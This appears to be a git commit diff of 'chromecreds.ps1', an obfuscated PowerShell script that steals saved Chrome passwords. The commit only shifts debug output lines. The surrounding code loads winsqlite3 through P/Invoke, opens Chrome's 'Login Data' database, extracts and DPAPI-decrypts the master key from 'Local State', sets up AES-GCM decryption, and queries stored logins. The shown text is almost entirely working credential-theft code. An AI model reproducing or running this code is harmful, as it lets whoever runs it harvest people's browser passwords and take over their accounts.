b8fdb84fbac0b7f8b32fa6a431751e4b091cf2e9
Jan <86189907+prxide@users.noreply.github.com>
2023-01-16 21:37:15 +0100

    Update chromecreds.ps1

--- chromecreds.ps1
+++ chromecreds.ps1
@@ -1,11 +1,8 @@
 
-Write-Output "1"
 $d=Add-Type -A System.Security
-Write-Output "1"
 $p='public static'
-Write-Output "1"
 $g=""")]$p extern"
-Write-Output"2"
+
 $i='[DllImport("winsqlite3",EntryPoint="sqlite3_'
 $m="[MarshalAs(UnmanagedType.LP"
 $q='(s,i)'
@@ -15,6 +12,7 @@ $u=[Security.Cryptography.ProtectedData]
 Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"
 $s=[W]::O("$z\\Default\\Login Data",[ref]$d)
 $l=@()
+Write-Output "1"
 if($host.Version-like"7*"){$b=(gc "$z\\Local State"|ConvertFrom-Json).os_crypt.encrypted_key
 $x=[Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))}$_=[W]::P($d,"SELECT*FROM logins WHERE blacklisted_by_user=0",-1,[ref]$s,0)
 for(;!([W]::S($s)%100)){$l+=[W]::T($s,0),[W]::T($s,3)
